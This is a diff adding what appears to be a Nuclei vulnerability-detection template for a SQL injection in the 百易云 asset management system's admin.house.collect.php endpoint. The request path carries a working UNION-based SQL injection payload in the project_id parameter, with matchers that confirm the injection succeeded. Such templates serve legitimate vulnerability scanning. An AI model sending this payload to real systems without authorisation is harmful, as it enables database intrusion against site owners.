@@ -1,0 +1,26 @@
+id: baiyishequ-adminhouse-collect-sqli
+info:
+  name: 百易云资产管理运营系统 admin.house.collect.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "/wuser/admin.house.collect.php?project_id=1)+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,{{t2}},0x7e),NULL,NULL,NULL,NULL,NULL,NULL--+-"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "building_code="
